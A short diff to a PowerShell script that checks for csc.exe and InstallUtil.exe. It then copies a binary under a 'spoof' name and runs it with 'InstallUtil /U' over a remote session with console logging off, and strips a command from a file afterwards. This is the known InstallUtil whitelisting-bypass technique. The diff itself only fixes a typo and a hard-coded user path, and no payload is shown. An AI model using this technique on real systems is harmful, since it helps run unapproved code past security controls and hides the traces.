@@ -51,7 +51,7 @@ param(
 )
 $realpath="C:\Windows\Microsoft.NET\Framework64\v2.0.50727\"
 $pathcheck1=Test-Path "$realpath\csc.exe"
-$pathcheck2=Test-Path "$realpath\instalutil.exe"
+$pathcheck2=Test-Path "$realpath\installutil.exe"
 if($pathcheck1 -and $pathcheck2){
 Write-Host "You have the files necessary to go on" -ForegroundColor Green
 }#End If
@@ -126,7 +126,7 @@ Invoke-Expression -Command $command
 if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\instalutil.exe" -Encoding Byte
 [System.IO.File]::WriteAllBytes("C:\$env:username\desktop\$Spoofname",$SpoofContent)
-$command2="InstallUtil.exe/logfile=C:\Users\fmc\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
+$command2="InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
